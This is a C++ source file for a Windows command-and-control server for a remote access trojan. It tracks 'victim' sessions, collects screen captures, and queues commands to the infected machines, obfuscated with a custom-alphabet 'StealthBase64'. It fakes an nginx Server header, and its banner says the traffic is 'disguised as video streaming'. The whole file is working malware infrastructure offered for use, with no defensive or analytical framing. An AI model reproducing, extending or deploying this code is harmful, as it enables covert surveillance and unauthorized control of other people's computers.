#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <thread>
#include <mutex>
#include <sstream>
#include <chrono>
#include <queue>
#include <fstream>
#include <algorithm>
#include <iomanip>

#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

// Base64 decoder for client data
class StealthBase64 {
private:
    static const std::string chars;
    
public:
    static std::string decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::string result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return result;
    }
    
    static std::string encode(const std::string& input) {
        std::string result;
        int val = 0, valb = -6;
        for (unsigned char c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }
};

const std::string StealthBase64::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

// Global storage for remote desktop sessions
struct RemoteSession {
    std::string id;
    std::string ip;
    std::chrono::system_clock::time_point last_seen;
    bool active;
    int width, height;
    std::string latest_screen_data;
    std::queue<std::string> pending_inputs;
};

class NativeRemoteDesktopServer {
private:
    int port;
    SOCKET server_socket;
    std::map<std::string, RemoteSession> sessions;
    std::mutex sessions_mutex;
    
    std::string generateSessionId(const std::string& ip) {
        auto now = std::chrono::system_clock::now();
        auto time_point = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
        std::string combined = ip + std::to_string(time_point);
        return StealthBase64::encode(combined).substr(0, 12);
    }
    
    std::string getCurrentTime() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
    
    std::string extractJsonValue(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":\"";
        size_t pos = json.find(search);
        if (pos != std::string::npos) {
            pos += search.length();
            size_t end = json.find("\"", pos);
            if (end != std::string::npos) {
                return json.substr(pos, end - pos);
            }
        }
        return "";
    }
    
    void sendHttpResponse(SOCKET client_socket, int status_code, const std::string& content_type, const std::string& body) {
        std::stringstream response;
        response << "HTTP/1.1 " << status_code;
        
        switch (status_code) {
            case 200: response << " OK"; break;
            case 404: response << " Not Found"; break;
            case 400: response << " Bad Request"; break;
            default: response << " Unknown";
        }
        
        response << "\r\n";
        response << "Content-Type: " << content_type << "\r\n";
        response << "Content-Length: " << body.length() << "\r\n";
        response << "Connection: close\r\n";
        response << "Server: nginx/1.18.0\r\n";
        response << "Access-Control-Allow-Origin: *\r\n";
        response << "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n";
        response << "Access-Control-Allow-Headers: Content-Type\r\n";
        response << "Cache-Control: no-cache\r\n";
        response << "\r\n";
        response << body;
        
        std::string resp_str = response.str();
        send(client_socket, resp_str.c_str(), resp_str.length(), 0);
    }
    
    void handleRequest(SOCKET client_socket, const std::string& client_ip) {
        char buffer[8192] = {0};
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytes_received <= 0) {
            closesocket(client_socket);
            return;
        }
        
        std::string request(buffer, bytes_received);
        std::vector<std::string> lines;
        std::stringstream ss(request);
        std::string line;
        while (std::getline(ss, line)) {
            lines.push_back(line);
        }
        
        if (lines.empty()) {
            closesocket(client_socket);
            return;
        }
        
        std::istringstream iss(lines[0]);
        std::string method, path, version;
        iss >> method >> path >> version;
        
        if (path.back() == '\r') path.pop_back();
        
        std::cout << "[" << getCurrentTime() << "] " << method << " " << path << " from " << client_ip << std::endl;
        
        // Handle API endpoints only - no HTML served
        if (path == "/api/connect" && method == "GET") {
            handleConnect(client_socket, client_ip);
        } else if (path.find("/api/stream/") == 0 && method == "POST") {
            std::string session_id = path.substr(12);
            size_t body_start = request.find("\r\n\r\n");
            if (body_start != std::string::npos) {
                body_start += 4;
                std::string body = request.substr(body_start);
                handleScreenData(client_socket, session_id, body);
            }
        } else if (path.find("/api/input/") == 0 && method == "GET") {
            std::string session_id = path.substr(11);
            handleInputRequest(client_socket, session_id);
        } else if (path.find("/api/input/") == 0 && method == "POST") {
            std::string session_id = path.substr(11);
            size_t body_start = request.find("\r\n\r\n");
            if (body_start != std::string::npos) {
                body_start += 4;
                std::string body = request.substr(body_start);
                handleInputSubmit(client_socket, session_id, body);
            }
        } else if (path == "/api/sessions" && method == "GET") {
            handleSessionsList(client_socket);
        } else if (path.find("/api/frame/") == 0 && method == "GET") {
            std::string session_id = path.substr(11);
            handleFrameRequest(client_socket, session_id);
        } else {
            // Return 404 for everything else
            sendHttpResponse(client_socket, 404, "text/plain", "Not Found");
        }
        
        closesocket(client_socket);
    }
    
    void handleConnect(SOCKET client_socket, const std::string& client_ip) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        std::string session_id = generateSessionId(client_ip);
        RemoteSession session;
        session.id = session_id;
        session.ip = client_ip;
        session.last_seen = std::chrono::system_clock::now();
        session.active = true;
        session.width = 0;
        session.height = 0;
        
        sessions[session_id] = session;
        
        std::cout << "[+] New victim connected: " << session_id << " from " << client_ip << std::endl;
        
        std::string response = "{\"status\":\"connected\",\"session\":\"" + session_id + "\"}";
        sendHttpResponse(client_socket, 200, "application/json", response);
    }
    
    void handleScreenData(SOCKET client_socket, const std::string& session_id, const std::string& data) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            sessions[session_id].last_seen = std::chrono::system_clock::now();
            
            // Extract screen data from JSON payload
            std::string width_str = extractJsonValue(data, "width");
            std::string height_str = extractJsonValue(data, "height");
            std::string screen_data = extractJsonValue(data, "data");
            
            if (!width_str.empty() && !height_str.empty() && !screen_data.empty()) {
                sessions[session_id].width = std::stoi(width_str);
                sessions[session_id].height = std::stoi(height_str);
                sessions[session_id].latest_screen_data = screen_data;
                
                std::cout << "[+] Screen update: " << session_id << " (" 
                         << width_str << "x" << height_str << ")" << std::endl;
            }
            
            sendHttpResponse(client_socket, 200, "text/plain", "OK");
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
        }
    }
    
    void handleInputRequest(SOCKET client_socket, const std::string& session_id) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            std::string input_cmd = "";
            if (!sessions[session_id].pending_inputs.empty()) {
                input_cmd = sessions[session_id].pending_inputs.front();
                sessions[session_id].pending_inputs.pop();
            }
            
            std::string response = "{\"input\":\"" + input_cmd + "\"}";
            sendHttpResponse(client_socket, 200, "application/json", response);
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
        }
    }
    
    void handleInputSubmit(SOCKET client_socket, const std::string& session_id, const std::string& data) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            std::string input_data = extractJsonValue(data, "input");
            if (!input_data.empty()) {
                sessions[session_id].pending_inputs.push(input_data);
                std::cout << "[+] Input queued for " << session_id << std::endl;
            }
            sendHttpResponse(client_socket, 200, "text/plain", "OK");
        } else {
            sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
        }
    }
    
    void handleSessionsList(SOCKET client_socket) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        std::stringstream json;
        json << "{\"sessions\":[";
        
        bool first = true;
        for (const auto& pair : sessions) {
            if (!first) json << ",";
            const RemoteSession& session = pair.second;
            json << "{";
            json << "\"id\":\"" << session.id << "\",";
            json << "\"ip\":\"" << session.ip << "\",";
            json << "\"active\":" << (session.active ? "true" : "false");
            json << "}";
            first = false;
        }
        
        json << "]}";
        sendHttpResponse(client_socket, 200, "application/json", json.str());
    }
    
    void handleFrameRequest(SOCKET client_socket, const std::string& session_id) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        
        if (sessions.find(session_id) != sessions.end()) {
            const RemoteSession& session = sessions[session_id];
            
            std::stringstream json;
            json << "{";
            json << "\"width\":" << session.width << ",";
            json << "\"height\":" << session.height << ",";
            json << "\"screen\":\"" << session.latest_screen_data << "\"";
            json << "}";
            
            sendHttpResponse(client_socket, 200, "application/json", json.str());
        } else {
            sendHttpResponse(client_socket, 404, "application/json", "{\"error\":\"Session not found\"}");
        }
    }
    
    void commandInterface() {
        std::cout << "\n=== Native Remote Desktop Controller ===" << std::endl;
        std::cout << "Commands:" << std::endl;
        std::cout << "  sessions - List active victim sessions" << std::endl;
        std::cout << "  info <session_id> - Show session details" << std::endl;
        std::cout << "  input <session_id> <command> - Send input to victim" << std::endl;
        std::cout << "  exit - Quit server" << std::endl;
        
        std::string input;
        while (true) {
            std::cout << "server> ";
            std::getline(std::cin, input);
            
            if (input == "exit") {
                exit(0);
            } else if (input == "sessions") {
                listSessions();
            } else if (input.find("info ") == 0) {
                std::string session_id = input.substr(5);
                showSessionInfo(session_id);
            } else if (input.find("input ") == 0) {
                handleCommandInput(input.substr(6));
            }
        }
    }
    
    void listSessions() {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        std::cout << "\nActive Sessions:" << std::endl;
        std::cout << std::string(50, '=') << std::endl;
        
        for (const auto& pair : sessions) {
            const RemoteSession& session = pair.second;
            auto duration = std::chrono::duration_cast<std::chrono::minutes>(
                std::chrono::system_clock::now() - session.last_seen);
            
            std::cout << "Session: " << session.id << std::endl;
            std::cout << "  IP: " << session.ip << std::endl;
            std::cout << "  Screen: " << session.width << "x" << session.height << std::endl;
            std::cout << "  Last seen: " << duration.count() << " minutes ago" << std::endl;
            std::cout << std::string(30, '-') << std::endl;
        }
    }
    
    void showSessionInfo(const std::string& session_id) {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        if (sessions.find(session_id) != sessions.end()) {
            const RemoteSession& session = sessions[session_id];
            std::cout << "\nSession Details:" << std::endl;
            std::cout << "ID: " << session.id << std::endl;
            std::cout << "IP: " << session.ip << std::endl;
            std::cout << "Resolution: " << session.width << "x" << session.height << std::endl;
            std::cout << "Status: " << (session.active ? "Active" : "Inactive") << std::endl;
        } else {
            std::cout << "Session not found" << std::endl;
        }
    }
    
    void handleCommandInput(const std::string& params) {
        size_t space = params.find(' ');
        if (space == std::string::npos) {
            std::cout << "Usage: input <session_id> <command>" << std::endl;
            return;
        }
        
        std::string session_id = params.substr(0, space);
        std::string command = params.substr(space + 1);
        
        std::lock_guard<std::mutex> lock(sessions_mutex);
        if (sessions.find(session_id) != sessions.end()) {
            std::string encoded = StealthBase64::encode(command);
            sessions[session_id].pending_inputs.push(encoded);
            std::cout << "Command sent to " << session_id << std::endl;
        } else {
            std::cout << "Session not found" << std::endl;
        }
    }

public:
    NativeRemoteDesktopServer(int p) : port(p) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error("WSAStartup failed");
        }
    }
    
    ~NativeRemoteDesktopServer() {
        WSACleanup();
    }
    
    void start() {
        server_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket == INVALID_SOCKET) {
            throw std::runtime_error("Failed to create socket");
        }
        
        int opt = 1;
        setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        sockaddr_in address;
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(port);
        
        if (bind(server_socket, (struct sockaddr*)&address, sizeof(address)) < 0) {
            throw std::runtime_error("Bind failed");
        }
        
        if (listen(server_socket, 10) < 0) {
            throw std::runtime_error("Listen failed");
        }
        
        std::cout << "===============================================" << std::endl;
        std::cout << "  Native Remote Desktop Server Started" << std::endl;
        std::cout << "===============================================" << std::endl;
        std::cout << " Listening on port: " << port << std::endl;
        std::cout << " Victims connect to: http://your-ip:" << port << "/api/connect" << std::endl;
        std::cout << " Traffic disguised as video streaming" << std::endl;
        std::cout << " Native desktop client opens automatically" << std::endl;
        std::cout << "===============================================" << std::endl;
        
        // Start command interface in separate thread
        std::thread cmd_thread(&NativeRemoteDesktopServer::commandInterface, this);
        cmd_thread.detach();
        
        while (true) {
            sockaddr_in client_addr;
            int client_addr_len = sizeof(client_addr);
            
            SOCKET client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_len);
            if (client_socket == INVALID_SOCKET) {
                continue;
            }
            
            std::string client_ip = inet_ntoa(client_addr.sin_addr);
            std::thread(&NativeRemoteDesktopServer::handleRequest, this, client_socket, client_ip).detach();
        }
    }
};

int main(int argc, char* argv[]) {
    int port = 8080;
    if (argc > 1) {
        port = std::stoi(argv[1]);
    }
    
    try {
        NativeRemoteDesktopServer server(port);
        server.start();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}